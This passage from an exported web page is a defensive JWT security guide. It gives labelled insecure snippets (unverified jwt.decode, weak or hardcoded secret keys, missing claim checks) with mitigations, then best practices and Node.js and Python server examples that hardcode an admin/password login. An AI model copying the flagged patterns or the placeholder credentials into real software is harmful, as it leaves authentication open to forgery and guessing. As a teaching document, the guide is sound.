referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80a8-b7fa-c5a2bd2c6591" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ WRONG: No expiration check
+const decoded = jwt.decode(token);  // Doesn&#x27;t validate exp
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8048-9f56-d4d15e40167b" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8078-a2a9-cae6367c6944" class="bulleted-list"><li style="list-style-type:disc">✅ Always use <code>jwt.verify()</code> instead of <code>jwt.decode()</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8006-ac1d-c4edc6912a8c" class="bulleted-list"><li style="list-style-type:disc">✅ Verify <code>exp</code> claim automatically (built into jwt.verify)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80be-ba3d-c15ae963410f" class="bulleted-list"><li style="list-style-type:disc">✅ Validate <code>iat</code> and <code>nbf</code> claims</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ac-a411-de5fc039e3a2" class="bulleted-list"><li style="list-style-type:disc">✅ Implement clock synchronization</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80a8-99ca-c16ebdfeb167" class=""><strong>6. Weak Secret Keys</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8032-9eb5-f946dd55b295" class=""><strong>Problem:</strong> Short or predictable secret keys can be brute-forced.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a6-9112-d695944308a6" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80e7-aa28-f8f00ae53971" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ WRONG: Weak key
+const secret = &quot;password123&quot;;  // Too short and predictable
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c4-91d8-c7bf482c7cde" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-802b-bbea-d71d738f4096" class="bulleted-list"><li style="list-style-type:disc">✅ Use long, random keys (minimum 256 bits)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8001-980e-cfcf01a87ccd" class="bulleted-list"><li style="list-style-type:disc">✅ Generate keys using cryptographically secure random generators</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808a-a778-c698fd14ecdc" class="bulleted-list"><li style="list-style-type:disc">✅ Store keys securely (environment variables, secret managers)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ce-bcf5-edca50e28f66" class="bulleted-list"><li style="list-style-type:disc">✅ Rotate keys periodically</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8033-adfd-e7d021d2e2be" class=""><strong>7. Insufficient Claim Validation</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-806f-95d8-ea7a31ef83b1" class=""><strong>Problem:</strong> Server doesn&#x27;t validate all claims, allowing token manipulation.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8096-9019-cdf4178bec37" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80ea-8225-e47a9355a8fd" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ WRONG: Only checks signature
+const decoded = jwt.verify(token, secret);
+// Doesn&#x27;t validate issuer, audience, etc.
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8076-b41a-f3aeb809a596" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f0-ac4f-c64bd6091456" class="bulleted-list"><li style="list-style-type:disc">✅ Validate all claims (iss, aud, exp, iat, nbf)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8089-a54f-e2986c1feda7" class="bulleted-list"><li style="list-style-type:disc">✅ Validate custom claims (roles, permissions)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a5-8197-d35be8e2b14f" class="bulleted-list"><li style="list-style-type:disc">✅ Implement proper authorization checks</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8006-937a-e740bc2fda4d" class="bulleted-list"><li style="list-style-type:disc">✅ Use claim validation libraries</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8044-890e-f9411ca010b6" class=""><strong>8. Key Management Issues</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a6-8b49-d7094178819f" class=""><strong>Problem:</strong> Secret keys are compromised, hardcoded, or improperly managed.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80bb-9666-ef48730ffbf4" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8002-85f9-c64a636d4cd8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ WRONG: Hardcoded key
+const secret = &quot;my-secret-key&quot;;  // In source code!
+
+// ❌ WRONG: Key in version control
+// config.json committed to Git
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80f9-8a40-f75cf84bc7dc" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8040-93c9-ceaab86dddc9" class="bulleted-list"><li style="list-style-type:disc">✅ Never hardcode keys in source code</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8031-bf0a-cb1cf6657364" class="bulleted-list"><li style="list-style-type:disc">✅ Use environment variables</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8037-97c2-e9dbb062e3b8" class="bulleted-list"><li style="list-style-type:disc">✅ Use secret management services</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f0-b42d-ef9d522ec1e9" class="bulleted-list"><li style="list-style-type:disc">✅ Implement key rotation</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ef-a5fa-da6c2abb4dc0" class="bulleted-list"><li style="list-style-type:disc">✅ Use different keys for different environments</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-804e-9481-d51585cba9c7" class="bulleted-list"><li style="list-style-type:disc">✅ Never commit keys to version control</li></ul></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-8056-88cf-d7a972b3b3a1"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80c4-884f-e0651e763278" class=""><strong>Best Practices</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80cc-be6f-e3f3be6c2efe" class=""><strong>1. Use Secure Connection (HTTPS)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8038-8857-dc8d73742a1b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Always use HTTPS
+// ❌ Never send JWT over HTTP
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-804a-9395-f32e2f5771a4" class=""><strong>2. Never Transfer Sensitive Information</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80f4-8dd0-fd4dacdc21a0" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Only include necessary claims
+const payload = {
+  userId: &#x27;123&#x27;,
+  role: &#x27;admin&#x27;
+  // No passwords, PII, or sensitive data
+};
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-808a-8387-de24029934f5" class=""><strong>3. Limit JWT Lifespan</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-807a-b0a2-de0b99a58bff" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Short-lived access tokens
+jwt.sign(payload, secret, { expiresIn: &#x27;15m&#x27; });
+
+// ✅ Use refresh tokens for longer sessions
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8007-a367-e8843d344426" class=""><strong>4. Use Long Key Passphrase</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80a9-a506-c410e520392e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Generate long, random key
+const secret = crypto.randomBytes(64).toString(&#x27;hex&#x27;);
+// 128 characters (512 bits)
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80a0-8a9f-c141b7389a5c" class=""><strong>5. Whitelist Authorized Signature Algorithms</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80ca-89ca-fa2280d7de33" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Always whitelist algorithms
+jwt.verify(token, secret, {
+  algorithms: [&#x27;HS256&#x27;]  // Explicit whitelist
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8036-a034-f71606c057c3" class=""><strong>6. Work with One Signature Algorithm Ideally</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80c2-9cfd-d0cc7c944c30" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Consistent algorithm usage
+// Use HS256 throughout the application
+// Or RS256 throughout the application
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-807e-8bcc-dab49f18e59c" class=""><strong>7. Choose Well-Known and Reliable Libraries</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8049-aa5d-ca9c64af0a38" class=""><strong>Recommended Libraries:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8078-a73f-ed2832bc8f57" class="bulleted-list"><li style="list-style-type:disc"><strong>Node.js</strong>: <code>jsonwebtoken</code> (node-jsonwebtoken)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-803b-ac33-d03aed25c7b7" class="bulleted-list"><li style="list-style-type:disc"><strong>Python</strong>: <code>PyJWT</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80e1-b4da-fe8ed456d5e6" class="bulleted-list"><li style="list-style-type:disc"><strong>Java</strong>: <code>java-jwt</code> (auth0)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8098-886b-f46fbab52df2" class="bulleted-list"><li style="list-style-type:disc"><strong>C#</strong>: <code>System.IdentityModel.Tokens.Jwt</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8008-b6ac-e551dbf006d7" class="bulleted-list"><li style="list-style-type:disc"><strong>Go</strong>: <code>github.com/golang-jwt/jwt</code></li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8002-8f57-d7c1fe453772" class=""><strong>8. Always Validate and Sanitize Data</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8046-b3b2-ccd1a385475e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Validate all claims
+jwt.verify(token, secret, {
+  algorithms: [&#x27;HS256&#x27;],
+  issuer: &#x27;my-api&#x27;,
+  audience: &#x27;my-app&#x27;
+});
+
+// ✅ Validate custom claims
+if (!decoded.role || ![&#x27;admin&#x27;, &#x27;user&#x27;].includes(decoded.role)) {
+  throw new Error(&#x27;Invalid role&#x27;);
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80a4-8537-f5ac6644ef32" class=""><strong>9. Use httpOnly Cookies for Storage</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8089-833a-dd1735e5171e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Store in httpOnly cookie
+res.cookie(&#x27;token&#x27;, token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: &#x27;strict&#x27;,
+  maxAge: 3600000
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-808d-8068-f4003a834a4d" class=""><strong>10. Implement Token Refresh Mechanism</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80d2-a010-c5602832e1a6" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Short access token + long refresh token
+const accessToken = jwt.sign(payload, secret, { expiresIn: &#x27;15m&#x27; });
+const refreshToken = jwt.sign({ userId: payload.userId }, secret, { expiresIn: &#x27;7d&#x27; });
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-80c4-b20d-dc2870698844"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-8080-8374-db059dac9a8c" class=""><strong>Implementation Examples</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-805c-8ecb-f5d57231c2ec" class=""><strong>Node.js/Express - Complete Example</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80ab-a2fc-c5dd08bfd541" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const express = require(&#x27;express&#x27;);
+const jwt = require(&#x27;jsonwebtoken&#x27;);
+const crypto = require(&#x27;crypto&#x27;);
+
+const app = express();
+app.use(express.json());
+
+// Secret key (from environment variable)
+const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString(&#x27;hex&#x27;);
+
+// Login endpoint
+app.post(&#x27;/login&#x27;, (req, res) =&gt; {
+  const { username, password } = req.body;
+
+  // Validate credentials (simplified)
+  if (username === &#x27;admin&#x27; &amp;&amp; password === &#x27;password&#x27;) {
+    // Create payload
+    const payload = {
+      userId: &#x27;123&#x27;,
+      username: username,
+      role: &#x27;admin&#x27;,
+      iat: Math.floor(Date.now() / 1000)
+    };
+
+    // Create access token (15 minutes)
+    const accessToken = jwt.sign(payload, JWT_SECRET, {
+      algorithm: &#x27;HS256&#x27;,
+      expiresIn: &#x27;15m&#x27;,
+      issuer: &#x27;my-api&#x27;,
+      audience: &#x27;my-app&#x27;
+    });
+
+    // Create refresh token (7 days)
+    const refreshToken = jwt.sign(
+      { userId: payload.userId },
+      JWT_SECRET,
+      {
+        algorithm: &#x27;HS256&#x27;,
+        expiresIn: &#x27;7d&#x27;,
+        issuer: &#x27;my-api&#x27;
+      }
+    );
+
+    // Send tokens in httpOnly cookies
+    res.cookie(&#x27;accessToken&#x27;, accessToken, {
+      httpOnly: true,
+      secure: true,
+      sameSite: &#x27;strict&#x27;,
+      maxAge: 15 * 60 * 1000  // 15 minutes
+    });
+
+    res.cookie(&#x27;refreshToken&#x27;, refreshToken, {
+      httpOnly: true,
+      secure: true,
+      sameSite: &#x27;strict&#x27;,
+      maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
+    });
+
+    res.json({ success: true });
+  } else {
+    res.status(401).json({ error: &#x27;Invalid credentials&#x27; });
+  }
+});
+
+// Middleware to verify JWT
+const verifyToken = (req, res, next) =&gt; {
+  const token = req.cookies.accessToken || req.headers.authorization?.split(&#x27; &#x27;)[1];
+
+  if (!token) {
+    return res.status(401).json({ error: &#x27;No token provided&#x27; });
+  }
+
+  try {
+    // Verify token
+    const decoded = jwt.verify(token, JWT_SECRET, {
+      algorithms: [&#x27;HS256&#x27;],  // Whitelist algorithms
+      issuer: &#x27;my-api&#x27;,       // Validate issuer
+      audience: &#x27;my-app&#x27;,     // Validate audience
+      maxAge: &#x27;2h&#x27;            // Maximum age
+    });
+
+    // Attach user info to request
+    req.user = decoded;
+    next();
+  } catch (error) {
+    if (error.name === &#x27;TokenExpiredError&#x27;) {
+      return res.status(401).json({ error: &#x27;Token expired&#x27; });
+    } else if (error.name === &#x27;JsonWebTokenError&#x27;) {
+      return res.status(401).json({ error: &#x27;Invalid token&#x27; });
+    } else {
+      return res.status(500).json({ error: &#x27;Token verification failed&#x27; });
+    }
+  }
+};
+
+// Protected route
+app.get(&#x27;/protected&#x27;, verifyToken, (req, res) =&gt; {
+  res.json({
+    message: &#x27;This is a protected route&#x27;,
+    user: req.user
+  });
+});
+
+// Refresh token endpoint
+app.post(&#x27;/refresh&#x27;, (req, res) =&gt; {
+  const refreshToken = req.cookies.refreshToken;
+
+  if (!refreshToken) {
+    return res.status(401).json({ error: &#x27;No refresh token provided&#x27; });
+  }
+
+  try {
+    // Verify refresh token
+    const decoded = jwt.verify(refreshToken, JWT_SECRET, {
+      algorithms: [&#x27;HS256&#x27;],
+      issuer: &#x27;my-api&#x27;
+    });
+
+    // Create new access token
+    const payload = {
+      userId: decoded.userId,
+      username: &#x27;admin&#x27;,  // Fetch from database
+      role: &#x27;admin&#x27;,
+      iat: Math.floor(Date.now() / 1000)
+    };
+
+    const accessToken = jwt.sign(payload, JWT_SECRET, {
+      algorithm: &#x27;HS256&#x27;,
+      expiresIn: &#x27;15m&#x27;,
+      issuer: &#x27;my-api&#x27;,
+      audience: &#x27;my-app&#x27;
+    });
+
+    res.cookie(&#x27;accessToken&#x27;, accessToken, {
+      httpOnly: true,
+      secure: true,
+      sameSite: &#x27;strict&#x27;,
+      maxAge: 15 * 60 * 1000
+    });
+
+    res.json({ success: true });
+  } catch (error) {
+    res.status(401).json({ error: &#x27;Invalid refresh token&#x27; });
+  }
+});
+
+app.listen(3000, () =&gt; {
+  console.log(&#x27;Server running on port 3000&#x27;);
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8055-90a7-f49dd8cfb437" class=""><strong>Python/Flask - Complete Example</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8044-bce8-f1b21cf676c2" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from flask import Flask, request, jsonify, make_response
+import jwt
+import datetime
+import os
+import secrets
+
+app = Flask(__name__)
+app.config[&#x27;SECRET_KEY&#x27;] = os.getenv(&#x27;JWT_SECRET&#x27;, secrets.token_hex(64))
+
+def create_token(user_id, username, role):
+    payload = {
+        &#x27;userId&#x27;: user_id,
+        &#x27;username&#x27;: username,
+        &#x27;role&#x27;: role,
+        &#x27;iat&#x27;: datetime.datetime.utcnow(),
+        &#x27;exp&#x27;: datetime.datetime.utcnow() + datetime.timedelta(minutes=15),
+        &#x27;iss&#x27;: &#x27;my-api&#x27;,
+        &#x27;aud&#x27;: &#x27;my-app&#x27;
+    }
+    return jwt.encode(payload, app.config[&#x27;SECRET_KEY&#x27;], algorithm=&#x27;HS256&#x27;)
+
+def verify_token(token):
+    try:
+        decoded = jwt.decode(
+            token,
+            app.config[&#x27;SECRET_KEY&#x27;],
+            algorithms=[&#x27;HS256&#x27;],
+            issuer=&#x27;my-api&#x27;,
+            audience=&#x27;my-app&#x27;
+        )
+        return decoded
+    except jwt.ExpiredSignatureError:
+        raise Exception(&#x27;Token expired&#x27;)
+    except jwt.InvalidTokenError:
+        raise Exception(&#x27;Invalid token&#x27;)
+
+@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])
+def login():
+    data = request.get_json()
+    username = data.get(&#x27;username&#x27;)
+    password = data.get(&#x27;password&#x27;)
+
+    # Validate credentials (simplified)
+    if username == &#x27;admin&#x27; and password == &#x27;password&#x27;:
+        token = create_token(&#x27;123&#x27;, username, &#x27;admin&#x27;)
+
+        response = make_response(jsonify({&#x27;success&#x27;: True}))
+        response.set_cookie(
+            &#x27;accessToken&#x27;,
+            token,
+            httponly=True,
+            secure=True,
+            samesite=&#x27;Strict&#x27;,
+            max_age=15*60  # 15 minutes
+        )
+        return response
+    else:
+        return jsonify({&#x27;error&#x27;: &#x27;Invalid credentials&#x27;}), 401
+
+@app.route(&#x27;/protected&#x27;, methods=[&#x27;GET&#x27;])
+def protected():
+    token = request.cookies.get(&#x27;accessToken&#x27;) or \
+            request.headers.get(&#x27;Authorization&#x27;, &#x27;&#x27;).split(&#x27; &#x27;)[-1]
+
+    if not token:
+        return jsonify({&#x27;error&#x27;: &#x27;No token provided&#x27;}), 401
+
+    try:
+        decoded = verify_token(token)
+        return jsonify({
+            &#x27;message&#x27;: &#x27;This is a protected route&#x27;,
+            &#x27;user&#x27;: decoded
